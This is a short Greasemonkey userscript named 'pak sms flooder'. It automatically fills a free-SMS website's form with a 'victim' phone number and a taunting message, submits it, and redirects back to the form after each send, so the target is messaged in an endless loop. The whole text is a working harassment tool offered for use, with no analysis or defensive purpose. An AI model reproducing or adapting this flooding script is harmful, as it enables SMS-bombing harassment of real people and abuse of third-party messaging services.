// ==UserScript==
// @name            pak sms flooder
// @namespace     Avirup
// @description    floods number
// @include       http://www.syk.be/*
// ==/UserScript==

var victim="00000000000";//
var sender="00000000000";
var smstext="Avirup ruless :P";

if(document.location=="http://sms4smile.com/send-free-sms/")
{
document.forms[0].elements[1].value=sender;

document.forms[0].elements[2].value=victim;

document.forms[0].elements[3].value=smstext;

document.forms[0].elements[5].click();

}
if(document.location=="http://sms4smile.com/sms-sent/")
{
document.location="http://sms4smile.com/send-free-sms/";
}